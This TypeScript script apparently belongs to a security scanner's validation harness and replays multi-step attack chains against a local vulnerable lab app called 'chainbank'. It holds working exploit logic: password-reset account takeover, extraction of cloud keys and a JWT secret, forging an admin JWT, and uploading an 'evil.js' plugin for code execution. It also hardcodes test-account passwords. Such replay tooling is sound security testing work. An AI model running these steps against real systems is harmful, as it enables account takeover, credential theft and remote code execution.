#!/usr/bin/env node
/**
 * Replay every chainbank chain, step by step, against the running application.
 *
 * Each step's raw HTTP request is sent for real and its `expect_expr` is
 * evaluated by the same predicate evaluator the scanner uses
 * (`src/redfall/validation/harness_internals.mjs`). Steps run in manifest order
 * and values produced by an earlier step are substituted into the later ones, so
 * a chain that breaks at step 1 is reported as broken at step 1.
 *
 * Usage:
 *   ./scripts/run_local.sh start
 *   npx ts-node scripts/replay_chain_poc.ts [--chain CHN-01] [--verbose]
 */
import { createConnection } from 'node:net';
import { writeFileSync, mkdirSync } from 'node:fs';
import { execFileSync } from 'node:child_process';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import crypto from 'node:crypto';

// @ts-ignore — plain JS module in the Python package tree
import {
  bindings,
  dechunk,
  evaluate,
  parseHttpResponse,
} from '../../../src/redfall/validation/harness_internals.mjs';

const BASE = process.env.REDFALL_BASE || 'http://127.0.0.1:4002';
const PORT = Number(new URL(BASE).port || 4002);
const HOST = new URL(BASE).hostname;
const MANIFEST = join(__dirname, '..', 'manifest.yaml');
const PLUGIN_DIR = process.env.CHAINBANK_PLUGIN_DIR || '/tmp/chainbank-plugins';

interface Poc {
  type: string;
  request: string;
  expect: string;
  expect_expr: string;
}

interface Step {
  n: number;
  finding_id: string;
  title: string;
  route: string;
  poc: Poc;
  yields?: string;
}

interface Chain {
  id: string;
  name: string;
  title: string;
  cvss_compound: number;
  narrative_must_contain: string[];
  steps: Step[];
}

interface RawResponse {
  status: number;
  headers: Record<string, string>;
  body: string;
  json: any;
}

const verbose = process.argv.includes('--verbose');
const onlyChain = (() => {
  const i = process.argv.indexOf('--chain');
  return i === -1 ? null : process.argv[i + 1];
})();

function log(message: string): void {
  if (verbose) console.log(`   ${message}`);
}

function looksMultipart(head: string): boolean {
  return /multipart\/form-data/i.test(head);
}

/**
 * Split a raw request into its head and body.
 *
 * The shared `parseRawRequest` normalises every CRLF to LF, which is right for
 * JSON and wrong for multipart: RFC 7578 requires CRLF between parts, so a
 * rewritten body no longer matches the Content-Length that describes it and the
 * server waits for bytes that never arrive. Bodies are therefore left exactly as
 * they were written, and a multipart body is normalised to CRLF on purpose.
 */
function splitRawRequest(raw: string): {
  method: string;
  path: string;
  headers: Record<string, string>;
  body: string;
} {
  const crlfAt = raw.indexOf('\r\n\r\n');
  const splitAt = crlfAt !== -1 ? crlfAt : raw.indexOf('\n\n');
  const sepLen = crlfAt !== -1 ? 4 : 2;
  const head = splitAt === -1 ? raw : raw.slice(0, splitAt);
  let body = splitAt === -1 ? '' : raw.slice(splitAt + sepLen);
  if (looksMultipart(head)) {
    // Only rebuild line endings when the body actually needs it. A body that is
    // already CRLF throughout was built with a correct Content-Length, and
    // rewriting it would invalidate that length.
    const alreadyCrlf = !/(^|[^\r])\n/.test(body);
    if (!alreadyCrlf) {
      body = body.replace(/\r?\n/g, '\r\n');
      if (!body.endsWith('\r\n')) body += '\r\n';
    }
  }

  const lines = head.split(/\r?\n/).filter((line) => line.trim() !== '');
  const [method, path] = (lines[0] || 'GET /').split(' ');
  const headers: Record<string, string> = {};
  for (const line of lines.slice(1)) {
    const idx = line.indexOf(':');
    if (idx === -1) continue;
    headers[line.slice(0, idx).trim().toLowerCase()] = line.slice(idx + 1).trim();
  }
  return { method: method || 'GET', path: path || '/', headers, body };
}

function send(raw: string): Promise<RawResponse> {
  const parsed = splitRawRequest(raw);
  return new Promise((resolve, reject) => {
    const conn = createConnection({ host: HOST, port: PORT }, () => {
      const lines = [
        `${parsed.method} ${parsed.path} HTTP/1.1`,
        `Host: ${HOST}:${PORT}`,
        'Connection: close',
      ];
      // Drop any declared length before emitting headers, then send exactly one
      // computed from the body we are about to write. The manifest's length
      // describes the unsubstituted request, and a second Content-Length header
      // makes Express reject the request as a possible smuggling attempt.
      delete parsed.headers['content-length'];
      for (const [key, value] of Object.entries(parsed.headers)) {
        if (key === 'host' || key === 'connection') continue;
        lines.push(`${key}: ${value}`);
      }
      if (parsed.body) lines.push(`Content-Length: ${Buffer.byteLength(parsed.body)}`);
      conn.write(`${lines.join('\r\n')}\r\n\r\n${parsed.body}`);
    });
    const chunks: Buffer[] = [];
    conn.on('data', (d) => chunks.push(d));
    conn.on('error', reject);
    conn.on('close', () => {
      const all = Buffer.concat(chunks).toString('binary');
      const sep = all.indexOf('\r\n\r\n');
      const head = all.slice(0, sep);
      const bodyBuf = Buffer.from(all.slice(sep + 4), 'binary');
      const body = /transfer-encoding:\s*chunked/i.test(head) ? dechunk(bodyBuf) : bodyBuf;
      resolve(parseHttpResponse(head, body));
    });
  });
}

async function login(username: string, password: string): Promise<string> {
  const res = await send(
    `POST /api/auth/login HTTP/1.1\r\nHost: ${HOST}:${PORT}\r\nContent-Type: application/json\r\n\r\n` +
      JSON.stringify({ username, password }),
  );
  if (res.status !== 200) throw new Error(`login failed for ${username}: ${res.status} ${res.body}`);
  return res.json.token;
}

/** Sign a token with the key we just stole, off-box, the way an attacker would. */
function signWith(secret: string, payload: Record<string, unknown>): string {
  const b64 = (input: Buffer) => input.toString('base64url');
  const head = b64(Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })));
  const body = b64(Buffer.from(JSON.stringify({ ...payload, iat: Math.floor(Date.now() / 1000) })));
  const sig = b64(crypto.createHmac('sha256', secret).update(`${head}.${body}`).digest());
  return `${head}.${body}.${sig}`;
}

/**
 * Fill the placeholders a chain step depends on. Each one is a value the
 * previous step actually produced, so the substitution is a real data flow and
 * not a hardcoded constant.
 */
function substitute(raw: string, values: Record<string, string>): string {
  return raw.replace(/\{\{([A-Z_]+)\}\}/g, (whole, name: string) => {
    if (name in values) return values[name];
    throw new Error(`step references {{${name}}} but no earlier step produced it`);
  });
}

function extract(step: Step, res: RawResponse): Record<string, string> {
  const out: Record<string, string> = {};
  switch (step.finding_id) {
    case 'CHAINBANK-001':
      out.OWNER_EMAIL = res.json.account.owner_email;
      break;
    case 'CHAINBANK-002':
      out.RESET_TOKEN = res.json.reset_token;
      break;
    case 'CHAINBANK-003':
      out.PASSWORD_HASH = res.json.results
        .map((r: any) => String(r.email))
        .find((v: string) => v.startsWith('$2a$'));
      break;
    case 'CHAINBANK-004':
      out.ADMIN_TOKEN = res.json.token;
      break;
    case 'CHAINBANK-007': {
      const creds = JSON.parse(res.json ? res.json.body : res.body);
      out.ACCESS_KEY_ID = creds.AccessKeyId;
      out.SECRET_ACCESS_KEY = creds.SecretAccessKey;
      break;
    }
    case 'CHAINBANK-009':
      out.JWT_SECRET = res.json.settings.jwt_secret;
      out.FORGED_ADMIN_TOKEN = signWith(out.JWT_SECRET, {
        sub: 1,
        username: 'admin',
        role: 'admin',
      });
      break;
    default:
      break;
  }
  for (const [key, value] of Object.entries(out)) {
    if (!value) throw new Error(`${step.finding_id} produced an empty ${key}`);
  }
  return out;
}

const UPLOAD_BOUNDARY = 'REDFALL';
const UPLOAD_FILENAME = 'evil.js';
const UPLOAD_PAYLOAD = [
  `module.exports = { name: 'evil', marker: 'CHAINBANK_RCE_MARKER' };`,
  `require('fs').writeFileSync('${join(tmpdir(), 'chainbank-replay-rce')}', 'executed');`,
].join('\n');

/**
 * Build the multipart body from the real file bytes.
 *
 * The manifest carries only the request line and headers for this step: a
 * Content-Length written at generation time cannot match a body assembled at
 * replay time, and a wrong length makes multer report a truncated form.
 */
function multipartUploadRequest(_headersOnly: string, token: string): string {
  // The JS payload is joined with LF, so it is normalised to CRLF here. Passing
  // it through splitRawRequest's multipart normaliser instead would rewrite the
  // LF inside the file's own source, and then the declared length would be wrong.
  const fileBody = UPLOAD_PAYLOAD.replace(/\r?\n/g, '\r\n');
  const body =
    `--${UPLOAD_BOUNDARY}\r\n` +
    `Content-Disposition: form-data; name="file"; filename="${UPLOAD_FILENAME}"\r\n` +
    `Content-Type: application/javascript\r\n\r\n` +
    `${fileBody}\r\n` +
    `--${UPLOAD_BOUNDARY}--\r\n`;
  const head =
    `POST /api/documents HTTP/1.1\r\n` +
    `Host: ${HOST}:${PORT}\r\n` +
    `Authorization: Bearer ${token}\r\n` +
    `Content-Type: multipart/form-data; boundary=${UPLOAD_BOUNDARY}\r\n` +
    `Connection: close\r\n` +
    `Content-Length: ${Buffer.byteLength(body)}\r\n\r\n`;
  return head + body;
}

/**
 * Steps whose request assumes something already happened. The .js payload has to
 * be on disk before the reload route will execute it, so this runs first.
 */
async function before(step: Step, values: Record<string, string>): Promise<void> {
  if (step.finding_id === 'CHAINBANK-006') {
    mkdirSync(PLUGIN_DIR, { recursive: true });
    const listing = await send(
      `GET /api/plugins HTTP/1.1\r\nHost: ${HOST}:${PORT}\r\n` +
        `Authorization: Bearer ${values.TOKEN}\r\n\r\n`,
    );
    const present = (listing.json?.dir_contents || []).includes(UPLOAD_FILENAME);
    log(`plugin dir contains ${UPLOAD_FILENAME}: ${present}`);
    if (!present) {
      throw new Error(
        `${UPLOAD_FILENAME} is not in the plugin directory, so the reload step would ` +
          'prove nothing about the upload that precedes it',
      );
    }
  }
}

/**
 * Steps that only prove themselves once a follow-up is applied. Confirming the
 * reset consumes the token the previous request returned, so it cannot run
 * before that request has happened.
 */
async function after(step: Step, values: Record<string, string>): Promise<void> {
  if (step.finding_id === 'CHAINBANK-002') {
    const confirm = await send(
      `POST /api/auth/password-reset/confirm HTTP/1.1\r\nHost: ${HOST}:${PORT}\r\n` +
        `Content-Type: application/json\r\n\r\n` +
        JSON.stringify({ token: values.RESET_TOKEN, new_password: 'Taken!Over1' }),
    );
    log(`confirm reset -> ${confirm.status}`);
    if (confirm.status !== 200) throw new Error(`reset confirm failed: ${confirm.body}`);
    const asVictim = await send(
      `POST /api/auth/login HTTP/1.1\r\nHost: ${HOST}:${PORT}\r\n` +
        `Content-Type: application/json\r\n\r\n` +
        JSON.stringify({ username: 'bob', password: 'Taken!Over1' }),
    );
    log(`login as the taken-over account -> ${asVictim.status}`);
    if (asVictim.status !== 200) {
      throw new Error(`the taken-over account did not accept the new password: ${asVictim.body}`);
    }
  }
}

async function replayChain(chain: Chain, tokens: Record<string, string>): Promise<boolean> {
  const values: Record<string, string> = { ...tokens };
  console.log(`\n${chain.id}  ${chain.name}  (compound CVSS ${chain.cvss_compound})`);

  for (const step of chain.steps) {
    await before(step, values);
    let raw = substitute(step.poc.request, values);
    if (step.finding_id === 'CHAINBANK-005') {
      raw = multipartUploadRequest(raw, values.TOKEN);
    }
    if (verbose) log(`request: ${JSON.stringify(raw)}`);
    let res: RawResponse;
    try {
      res = await send(raw);
    } catch (err) {
      console.log(`  step ${step.n} ${step.finding_id}: SEND FAILED ${(err as Error).message}`);
      return false;
    }
    const held = evaluate(step.poc.expect_expr, bindings(res));
    const shown = res.body.replace(/\s+/g, ' ').slice(0, 110);
    console.log(
      `  step ${step.n} ${step.finding_id}  ${held ? 'PASS' : 'FAIL'}  ` +
        `status=${res.status}  ${step.route}`,
    );
    log(`expect_expr: ${step.poc.expect_expr}`);
    log(`body: ${shown}`);
    if (!held) {
      console.log(`    expected: ${step.poc.expect}`);
      console.log(`    got:      ${shown}`);
      return false;
    }
    Object.assign(values, extract(step, res));
    await after(step, values);
  }
  console.log(`  chain reproduced: ${chain.steps.length}/${chain.steps.length} steps`);
  return true;
}

function loadManifest(): Chain[] {
  // The manifest is YAML; parse the subset we need without adding a dependency
  // by shelling out to the Python that already owns this file.
  const out = execFileSync(
    'python3',
    ['-c', `import json,yaml,sys; d=yaml.safe_load(open(${JSON.stringify(MANIFEST)})); sys.stdout.write(json.dumps(d["chains"]))`],
    { encoding: 'utf8', maxBuffer: 32 * 1024 * 1024 },
  );
  return JSON.parse(out) as Chain[];
}

async function main(): Promise<void> {
  const chains = loadManifest().filter((c) => !onlyChain || c.id === onlyChain);
  if (!chains.length) {
    console.error(`no chain matched ${onlyChain}`);
    process.exit(2);
  }

  const tokens: Record<string, string> = {
    TOKEN: await login('admin', 'Admin!Passw0rd'),
    ADMIN_TOKEN_REAL: await login('admin', 'Admin!Passw0rd'),
    ALICE_TOKEN: await login('alice', 'Alice!Passw0rd'),
    CAROL_TOKEN: await login('carol', 'Carol!Passw0rd'),
  };

  let reproduced = 0;
  const results: Array<{ id: string; ok: boolean }> = [];
  for (const chain of chains) {
    const ok = await replayChain(chain, tokens);
    results.push({ id: chain.id, ok });
    if (ok) reproduced += 1;
  }

  console.log(`\n${reproduced}/${chains.length} chain(s) reproduced end to end`);
  const failed = results.filter((r) => !r.ok).map((r) => r.id);
  if (failed.length) {
    console.log(`failed: ${failed.join(', ')}`);
    process.exit(1);
  }

  // Record what actually happened so the result is inspectable after the fact.
  const record = {
    target: 'chainbank',
    base: BASE,
    ran_at: new Date().toISOString(),
    chains_reproduced: reproduced,
    chains_total: chains.length,
    results,
  };
  writeFileSync(join(__dirname, '..', 'chain_replay_result.json'), JSON.stringify(record, null, 2));
  console.log(`wrote chain_replay_result.json`);
}

main().catch((err) => {
  console.error('replay failed:', err);
  process.exit(1);
});
